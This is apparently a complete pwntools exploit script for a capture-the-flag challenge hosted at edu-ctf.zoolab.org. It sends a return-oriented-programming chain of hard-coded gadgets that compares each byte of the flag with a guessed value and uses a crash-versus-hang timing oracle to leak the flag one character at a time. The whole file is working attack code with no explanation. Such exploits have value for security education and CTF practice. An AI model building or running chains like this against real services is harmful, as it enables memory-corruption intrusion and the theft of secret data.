from pwn import *

#r = process('./share/chal')

syscall_ret = 0x425ad4
pop_rbx_ret = 0x0000000000401fa2
jmp_rbx = 0x00000000004176fd
flag_p = 0x4de2e0
pop_r14_ret = 0x0000000000402797 # 
pop_rax_ret = 0x0000000000458237 # 0x0000000000458237 : pop rax ; ret
'''
0x0000000000438c15 : cmp al, r14b ; ret
0x00000000004022ee : mov eax, dword ptr [rax] ; ret
0x0000000000426159 : jne 0x426148 ; ret
'''
infinite_loop = p64(pop_rbx_ret) + p64(jmp_rbx) + p64(jmp_rbx)

flag = ''    
idx = 0
while True :

    guess = 0x20
    while guess < 0x80 :
        #r = process('./share/chal')
        r = remote('edu-ctf.zoolab.org',10012)
        payload = p64(0) * 5
        payload += p64(pop_rax_ret) + p64(flag_p+idx) + p64(0x4022ee) # load flag char into rax
        payload += p64(pop_r14_ret) + p64(guess) + p64(0x438c15) ## cmp flag and guess
        payload += p64(0x426159) + infinite_loop 
        r.sendafter(b'rop\n',payload)
        try :
            r.recv(timeout=0.5)
            break
        except:
            guess += 1
        r.close()
    
    flag += chr(guess)
    idx+= 1
    print(flag)
    if guess == ord('}'): # stop when leak the last flag char
        break
print(flag)

